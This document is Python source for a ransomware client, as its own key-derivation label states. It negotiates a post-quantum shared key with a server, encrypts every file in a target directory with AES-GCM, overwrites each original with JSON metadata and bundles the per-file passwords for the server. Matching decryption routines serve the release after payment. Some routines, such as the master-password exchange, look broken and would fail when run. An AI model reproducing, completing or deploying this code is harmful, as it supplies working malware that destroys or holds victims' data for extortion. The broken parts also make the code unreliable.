import os
import secrets
import json
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import encrypt

DICTIONARY_PATH = "/usr/share/dict/words"
DIRECTORY_NAME = "test"
KEY_SIZE = 32  # 256 bits for AES-256
IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
SALT_SIZE = 16  # Size of the salt for Argon2id


class Client:

    server_kem_public_key: bytes
    communication_key: bytes

    def __init__(self, server_kem_public_key: bytes):
        self.server_kem_public_key = server_kem_public_key

    def establish_shared_secret(self) -> tuple[bytes, bytes]:
        """
        Establish a shared secret with the server using ML-KEM.

        :param self: The Client instance.
        :return: A tuple containing the ciphertext and the original plaintext shared secret.
        :rtype: tuple[bytes, bytes]
        """

        ciphertext, plaintext_original = encrypt(self.server_kem_public_key)

        return ciphertext, plaintext_original

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Client instance.
        :param shared_secret: The shared secret established with the server.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=KEY_SIZE,
            salt=None,
            info=b"Post-quantum ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_random_password(self) -> str:
        """
        Get a random password from the dictionary file.

        :param self: The Client instance.
        :return: The random password.
        :rtype: str
        """

        if not os.path.exists(DICTIONARY_PATH):
            raise FileNotFoundError(f"Dictionary file not found at {DICTIONARY_PATH}")

        with open(DICTIONARY_PATH, "r", encoding="utf-8") as f:
            words = f.read().splitlines()

        password = secrets.choice(words).strip()

        return password

    def derive_password_key(self, password: str, salt: bytes) -> bytes:
        """
        Derive a key from a password using Argon2id.

        :param self: The Client instance.
        :param password: The password to derive the key from.
        :param salt: The salt to use for key derivation.
        :return: The derived password key.
        :rtype: bytes
        """

        kdf = Argon2id(
            salt=salt,
            length=KEY_SIZE,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def encrypt(self, key: bytes, plaintext: bytes) -> tuple[bytes, bytes, bytes]:
        """
        Encrypt plaintext using AES-256-GCM.

        :param self: The Client instance.
        :param key: The encryption key.
        :param plaintext: The plaintext to encrypt.
        :return: A tuple containing the IV, ciphertext, and tag.
        :rtype: tuple[bytes, bytes, bytes]
        """

        iv = os.urandom(IV_SIZE)
        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
        ).encryptor()

        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag

        return iv, ciphertext, tag

    def decrypt(self, key: bytes, iv: bytes, ciphertext: bytes, tag: bytes) -> bytes:
        """
        Decrypt ciphertext using AES-256-GCM.

        :param self: The Client instance.
        :param key: The decryption key.
        :param iv: The initialization vector used during encryption.
        :param ciphertext: The ciphertext to decrypt.
        :param tag: The authentication tag from encryption.
        :return: The decrypted plaintext.
        :rtype: bytes
        """

        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
        ).decryptor()

        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        return plaintext

    def encrypt_file(self, id: int, file_path: str, master_key: bytes) -> str:
        """
        Derive a file key from a random password and encrypt the file and the file key.

        :param self: The Client instance.
        :param id: The unique identifier for the file.
        :param file_path: The path to the file to encrypt.
        :param master_key: The master key to encrypt the file key.
        :return: The password used to derive the file key.
        :rtype: str
        """

        password = self.get_random_password()
        salt = os.urandom(SALT_SIZE)
        file_key = self.derive_password_key(password, salt)

        with open(file_path, "rb") as f:
            plaintext = f.read()

        file_iv, file_ciphertext, file_tag = self.encrypt(file_key, plaintext)
        key_iv, key_ciphertext, key_tag = self.encrypt(master_key, file_key)

        metadata = {
            "file_id": id,
            "file_iv": b64encode(file_iv).decode("utf-8"),
            "file_ciphertext": b64encode(file_ciphertext).decode("utf-8"),
            "file_tag": b64encode(file_tag).decode("utf-8"),
            "key_iv": b64encode(key_iv).decode("utf-8"),
            "key_ciphertext": b64encode(key_ciphertext).decode("utf-8"),
            "key_tag": b64encode(key_tag).decode("utf-8"),
            "password_salt": b64encode(salt).decode("utf-8"),
        }

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(json.dumps(metadata, indent=2))

        return password

    def decrypt_file_with_password(
        self, file_path: str, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes
    ):
        """
        Decrypt a file using a password.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :param data_iv: The IV used for encrypting the password.
        :param data_ciphertext: The ciphertext of the password.
        :param data_tag: The authentication tag for the password.
        :return: None
        """

        # Decrypt the password sent by the server
        password = self.decrypt(
            self.communication_key, data_iv, data_ciphertext, data_tag
        ).decode("utf-8")
        print(f"The file password is : {password}")

        # Decrypt the file using the password
        with open(file_path, "r", encoding="utf-8") as f:
            metadata = json.loads(f.read())

        salt = b64decode(metadata["password_salt"])
        file_key = self.derive_password_key(password, salt)

        file_iv = b64decode(metadata["file_iv"])
        file_ciphertext = b64decode(metadata["file_ciphertext"])
        file_tag = b64decode(metadata["file_tag"])

        plaintext = self.decrypt(file_key, file_iv, file_ciphertext, file_tag)

        with open(file_path, "wb") as f:
            f.write(plaintext)

    def decrypt_file_with_master_key(self, file_path: str, master_key: bytes):
        """
        Decrypt a file using the master key.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :param master_key: The master key to decrypt the file key.
        :return: None
        """

        with open(file_path, "r", encoding="utf-8") as f:
            metadata = json.loads(f.read())

        key_iv = b64decode(metadata["key_iv"])
        key_ciphertext = b64decode(metadata["key_ciphertext"])
        key_tag = b64decode(metadata["key_tag"])

        file_key = self.decrypt(master_key, key_iv, key_ciphertext, key_tag)

        file_iv = b64decode(metadata["file_iv"])
        file_ciphertext = b64decode(metadata["file_ciphertext"])
        file_tag = b64decode(metadata["file_tag"])

        plaintext = self.decrypt(file_key, file_iv, file_ciphertext, file_tag)

        with open(file_path, "wb") as f:
            f.write(plaintext)

    def encrypt_files(self) -> tuple[bytes, bytes, bytes]:
        """
        Encrypt all files in the specified directory and store the encrypted master key and the master password salt in a file.

        :param self: The Client instance.
        :return: The encrypted passwords to send to the server.
        :rtype: tuple[bytes, bytes, bytes]
        """

        master_password = self.get_random_password()
        master_key = os.urandom(KEY_SIZE)
        passwords_for_server = [master_password]
        id = 1

        # Encrypt each file
        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                password = self.encrypt_file(id, file_path, master_key)
                passwords_for_server.append(password)
                id += 1

        # Encrypt the master key
        master_password_salt = os.urandom(SALT_SIZE)
        master_password_key = self.derive_password_key(
            master_password, master_password_salt
        )
        master_key_iv, master_key_ciphertext, master_key_tag = self.encrypt(
            master_password_key, master_key
        )

        # Save the master key metadata and the master password salt
        metadata = {
            "file_id": 0,
            "master_key_iv": b64encode(master_key_iv).decode("utf-8"),
            "master_key_ciphertext": b64encode(master_key_ciphertext).decode("utf-8"),
            "master_key_tag": b64encode(master_key_tag).decode("utf-8"),
            "master_password_salt": b64encode(master_password_salt).decode("utf-8"),
        }
        with open(
            f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json", "w", encoding="utf-8"
        ) as f:
            f.write(json.dumps(metadata, indent=2))

        # Encrypt the data to send to the server
        data = "\n".join(passwords_for_server).encode("utf-8")
        data_iv, data_ciphertext, data_tag = self.encrypt(self.communication_key, data)

        return data_iv, data_ciphertext, data_tag

    def decrypt_files(self, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes):
        """
        Decrypt all files in the specified directory using the master password.

        :param self: The Client instance.
        :param data_iv: The IV used for encrypting the master password.
        :param data_ciphertext: The ciphertext of the master password.
        :param data_tag: The authentication tag for the master password.
        :return: None
        """

        # Decrypt the master password sent by the server
        master_password = self.decrypt(
            self.communication_key, data_iv, data_ciphertext, data_tag
        ).decode("utf-8")
        print(f"The master password is: {master_password}")

        # Decrypt the master key
        with open(
            f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json", "r", encoding="utf-8"
        ) as f:
            metadata = json.loads(f.read())
        master_password_salt = b64decode(metadata["master_password_salt"])
        master_password_key = self.derive_password_key(
            master_password, master_password_salt
        )
        master_key_iv = b64decode(metadata["master_key_iv"])
        master_key_ciphertext = b64decode(metadata["master_key_ciphertext"])
        master_key_tag = b64decode(metadata["master_key_tag"])
        master_key = self.decrypt(
            master_password_key, master_key_iv, master_key_ciphertext, master_key_tag
        )

        # Decrypt each file using the master key
        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(".meta.json"):
                    continue
                self.decrypt_file_with_master_key(file_path, master_key)

        # Remove the master key metadata file
        os.remove(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json")

    def get_file_id(self, file_path: str) -> tuple[bytes, bytes, bytes]:
        """
        Get the unique identifier of the file from its metadata.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :return: The file ID to send to the server.
        :rtype: tuple[bytes, bytes, bytes]
        """

        with open(file_path, "r", encoding="utf-8") as f:
            metadata = json.loads(f.read())

        file_id = metadata["file_id"]

        # Encrypt the data to send to the server
        data_iv, data_ciphertext, data_tag = self.encrypt(
            self.communication_key, f"{file_id}".encode("utf-8")
        )

        return data_iv, data_ciphertext, data_tag

    def get_master_password_data(self) -> tuple[bytes, bytes, bytes, bytes, str]:
        """
        Get the data required to change the master password.
        :param self: The Client instance.
        :return: The data for the server to update the master password.
        :rtype: tuple[bytes, bytes, bytes, bytes, str]
        """

        with open(
            f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json", "r", encoding="utf-8"
        ) as f:
            metadata = json.loads(f.read())

        # Encrypt the data to send to the server
        data = "\n".join(
            [
                b64decode(metadata["master_key_iv"]),
                b64decode(metadata["master_key_ciphertext"]),
                b64decode(metadata["master_key_tag"]),
                b64decode(metadata["master_password_salt"]),
                self.get_random_password().encode("utf-8"),
            ]
        ).encode("utf-8")
        data_iv, data_ciphertext, data_tag = self.encrypt(self.communication_key, data)

        return data_iv, data_ciphertext, data_tag

    def change_master_password_data(
        self, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes
    ):
        """
        Update the master password data in the metadata file.

        :param self: The Client instance.
        :param data_iv: The IV used for encrypting the master password data.
        :param data_ciphertext: The ciphertext of the master password data.
        :param data_tag: The authentication tag for the master password data.
        :return: None
        """

        # Decrypt the master password data sent by the server
        data = self.decrypt(self.communication_key, data_iv, data_ciphertext, data_tag)
        master_password_data = data.decode("utf-8").splitlines()
        new_master_key_iv = master_password_data[0]
        new_master_key_ciphertext = master_password_data[1]
        new_master_key_tag = master_password_data[2]
        new_master_password_salt = master_password_data[3]

        # Update the metadata file
        with open(
            f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json", "r", encoding="utf-8"
        ) as f:
            metadata = json.loads(f.read())

        metadata["master_key_iv"] = b64encode(new_master_key_iv).decode("utf-8")
        metadata["master_key_ciphertext"] = b64encode(new_master_key_ciphertext).decode(
            "utf-8"
        )
        metadata["master_key_tag"] = b64encode(new_master_key_tag).decode("utf-8")
        metadata["master_password_salt"] = b64encode(new_master_password_salt).decode(
            "utf-8"
        )

        with open(
            f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.meta.json", "w", encoding="utf-8"
        ) as f:
            f.write(json.dumps(metadata, indent=2))
